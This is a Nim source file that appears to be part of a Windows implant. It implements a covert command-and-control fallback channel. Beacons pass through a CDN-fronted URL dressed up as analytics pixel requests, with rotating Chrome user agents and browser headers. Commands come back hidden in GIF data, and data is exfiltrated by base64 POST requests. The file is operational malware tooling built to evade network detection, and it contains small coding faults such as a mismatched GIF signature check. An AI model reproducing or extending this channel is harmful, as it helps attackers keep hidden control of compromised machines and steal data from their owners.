# hardened/https_fallback.nim — HTTPS-over-CDN fallback C2 channel
#
# Provides an HTTPS GET/POST-based C2 channel that routes through a
# legitimate CDN (Cloudflare, Fastly, Azure CDN). The agent makes
# requests to a CDN-fronted URL that proxies to the actual C2 server.
#
# Traffic blends with normal web browsing:
#   - User-Agent mimics Chrome on Windows
#   - TLS session uses the same pinned certificate as WSS
#   - Request paths look like static asset fetches
#   - Cookie carries a session token (same as WSS handshake)
#
# Protocol:
#   Beacon:  GET /assets/v<ver>/s_<session>.gif  (cookie: session=<token>)
#   Response: 1x1 transparent GIF with command hidden in pixel data
#             (steganographic encoding) or a JSON payload for non-image
#             responses.
#
#   Exfil:   POST /assets/v<ver>/u_<session>.gif
#            body: encrypted base64 data (same framing as WSS)
#   Response: 200 OK with "OK" body

when not defined(windows):
  {.error: "https_fallback.nim is Windows-only".}

import winim/lean
import winim/inc/windef
import std/[strutils, httpclient, uri, base64, times, json, locks, random, asyncdispatch]
import ./syscalls

proc randomToken(n: int = 4): string =
  for _ in 0..<n: result.add(toHex(rand(255), 2))

type
  HttpsFallback* = ref object
    baseUrl*: string          # CDN-fronted URL (e.g., "https://cdn.example.com")
    sessionToken*: string     # session cookie value
    userAgent*: string        # Chrome-like UA string
    pinnedCertPem*: string    # pinned cert (same as WSS path)
    enabled*: bool
    httpClient*: HttpClient

# ---- Realistic User-Agent strings ----------------------------------------
#
# Rotate through common Chrome UA strings to avoid a single-UA signature.
# Each session picks one at random.

const
  CHROME_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"
  ]

  # Request paths that look like static asset fetches
  BEACON_PATHS = [
    "/assets/v3/s_",
    "/static/v2/analytics.gif",
    "/cdn-cgi/trace",
    "/__utm.gif",
    "/pixel.gif",
    "/v1/ping"
  ]

  UPLOAD_PATHS = [
    "/assets/v3/u_",
    "/static/v2/collect.gif",
    "/cdn-cgi/imdata",
    "/v1/upload"
  ]

# ---- Steganographic encoding ---------------------------------------------
#
# Encode small payloads inside a 1x1 GIF. The "pixel" data of a 1x1
# transparent GIF is the palette entry — we overwrite it with our
# encrypted bytes. A real 1x1 GIF is 43 bytes; we use the LZW data
# section to hide up to 250 bytes.

const
  GIF_HEADER = "GIF89a"        # 6 bytes
  GIF_LOGICAL_SCREEN = [0x01, 0x00, 0x01, 0x00]  # 1x1, global color table
  GIF_GLOBAL_COLOR_TABLE = [0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF]  # 2 colors
  GIF_IMAGE_DESCRIPTOR = [0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00]
  GIF_TRAILER = [0x3B]

proc encodePayloadInGif*(payload: openArray[byte]): seq[byte] =
  # Encode payload bytes in the LZW data section of a 1x1 GIF.
  # The LZW minimum code size (1 byte) + sub-blocks can hold arbitrary data.
  if payload.len > 250: return  # too large for this carrier

  var gif = newSeqOfCap[byte](64)

  # Header
  for ch in GIF_HEADER: gif.add(byte(ord(ch)))

  # Logical Screen Descriptor (7 bytes: 4 packed + 1 bg + 1 aspect)
  gif.add(0x01); gif.add(0x00); gif.add(0x01); gif.add(0x00)  # 1x1
  gif.add(0x80)  # global color table flag set
  gif.add(0x00)  # background color index
  gif.add(0x00)  # pixel aspect ratio

  # Global Color Table (6 bytes: 2 colors × 3 bytes)
  gif.add(0x00); gif.add(0x00); gif.add(0x00)  # color 0: black
  gif.add(0xFF); gif.add(0xFF); gif.add(0xFF)  # color 1: white

  # Image Descriptor
  gif.add(0x2C)  # image separator
  gif.add(0x00); gif.add(0x00)  # left
  gif.add(0x00); gif.add(0x00)  # top
  gif.add(0x01); gif.add(0x00)  # width: 1
  gif.add(0x01); gif.add(0x00)  # height: 1
  gif.add(0x00)  # no local color table

  # LZW data: minimum code size (1 byte) + sub-blocks
  gif.add(0x02)  # LZW minimum code size = 2

  # Sub-block: length byte + data
  gif.add(byte(payload.len + 2))  # sub-block length
  gif.add(0x4C)  # LZW clear code (for 2-bit codes)
  gif.add(0x01)  # LZW end code
  for b in payload: gif.add(b)

  # Block terminator
  gif.add(0x00)

  # Trailer
  gif.add(0x3B)

  result = gif

proc decodePayloadFromGif*(gif: openArray[byte]): seq[byte] =
  # Extract payload bytes from a GIF's LZW sub-block data.
  if gif.len < 43: return
  if gif[0].char != 'G' or gif[1].char != 'I' or gif[2].char != 'F': return

  # Find the image descriptor (0x2C) after the global color table
  var pos = 13  # after logical screen (7) + global color table (6)
  if pos >= gif.len: return
  if gif[pos] != 0x2C: return

  # Skip image descriptor (10 bytes: separator + 8 descriptor + 1 min code)
  pos += 10
  if pos >= gif.len: return

  # LZW minimum code size
  inc pos  # skip LZW min code size byte
  if pos >= gif.len: return

  # Read sub-blocks
  while pos < gif.len:
    let blockLen = int(gif[pos])
    inc pos
    if blockLen == 0: break  # block terminator
    if pos + blockLen > gif.len: return
    # Skip the clear code (1 byte) and end code (1 byte)
    let dataStart = pos + 2
    let dataEnd = pos + blockLen
    if dataStart < dataEnd:
      for i in dataStart..<dataEnd:
        result.add(gif[i])
    pos += blockLen

# ---- Public API -----------------------------------------------------------

proc newHttpsFallback*(baseUrl, sessionToken, pinnedCert: string): HttpsFallback =
  let ua = CHROME_USER_AGENTS[rand(CHROME_USER_AGENTS.high)]
  result = HttpsFallback(
    baseUrl: baseUrl,
    sessionToken: sessionToken,
    userAgent: ua,
    pinnedCertPem: pinnedCert,
    enabled: true
  )
  result.httpClient = newHttpClient()
  result.httpClient.headers = newHttpHeaders({
    "User-Agent": ua,
    "Accept": "image/gif,image/png,image/webp,*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cookie": "session=" & sessionToken,
    "Referer": baseUrl & "/",
    "Sec-Fetch-Dest": "image",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Ch-Ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\""
  })

proc httpsSendBeacon*(fb: HttpsFallback; data: string): Future[string] {.async.} =
  # Send a beacon via HTTPS GET. The server responds with a command
  # encoded in the response body (either JSON or a steganographic GIF).
  if not fb.enabled or fb.httpClient == nil: return ""

  let path = BEACON_PATHS[rand(BEACON_PATHS.high)] & randomToken(8)
  let url = fb.baseUrl & path

  try:
    let resp = fb.httpClient.request(url, httpMethod = HttpGet)
    if resp.status.startsWith("200"):
      let body = resp.body
      if body.len == 0: return ""
      # Check if response is a GIF with embedded payload
      if body.len >= 43 and body[0..<6] == "GIF891a":
        let payload = decodePayloadFromGif(cast[seq[byte]](body))
        if payload.len > 0:
          result = cast[string](payload)
        else:
          result = body
      else:
        result = body
    else:
      result = ""
  except:
    result = ""

proc httpsSendData*(fb: HttpsFallback; data: seq[byte]): Future[bool] {.async.} =
  # Send data via HTTPS POST. Returns true on success.
  if not fb.enabled or fb.httpClient == nil: return false

  let path = UPLOAD_PATHS[rand(UPLOAD_PATHS.high)] & randomToken(8)
  let url = fb.baseUrl & path
  let b64 = base64.encode(data)

  try:
    var headers = newHttpHeaders({
      "User-Agent": fb.userAgent,
      "Content-Type": "application/octet-stream",
      "Accept": "*/*",
      "Cookie": "session=" & fb.sessionToken,
      "Referer": fb.baseUrl & "/"
    })
    let resp = fb.httpClient.request(url, httpMethod = HttpPost,
                                      body = b64,
                                      headers = headers)
    result = resp.status.startsWith("200") or resp.status.startsWith("204")
  except:
    result = false

# ---- Integration with existing agent loop ---------------------------------

var
  httpsFallbackInstance: HttpsFallback = nil
  httpsFallbackLock: Lock
  httpsFallbackEnabled = false

proc initHttpsFallback*(baseUrl, sessionToken, pinnedCert: string) =
  withLock httpsFallbackLock:
    if baseUrl.len == 0: return
    httpsFallbackInstance = newHttpsFallback(baseUrl, sessionToken, pinnedCert)
    httpsFallbackEnabled = true

proc httpsFallbackBeacon*(data: string): Future[string] {.async.} =
  # Send a beacon and return any command from C2.
  if not httpsFallbackEnabled or httpsFallbackInstance == nil: return ""
  result = await httpsSendBeacon(httpsFallbackInstance, data)

proc httpsFallbackSend*(data: seq[byte]): Future[bool] {.async.} =
  # Send data via HTTPS fallback.
  if not httpsFallbackEnabled or httpsFallbackInstance == nil: return false
  result = await httpsSendData(httpsFallbackInstance, data)

export HttpsFallback, newHttpsFallback, httpsSendBeacon, httpsSendData
export encodePayloadInGif, decodePayloadFromGif
export initHttpsFallback, httpsFallbackBeacon, httpsFallbackSend
export httpsFallbackEnabled, httpsFallbackInstance
export CHROME_USER_AGENTS, BEACON_PATHS, UPLOAD_PATHS
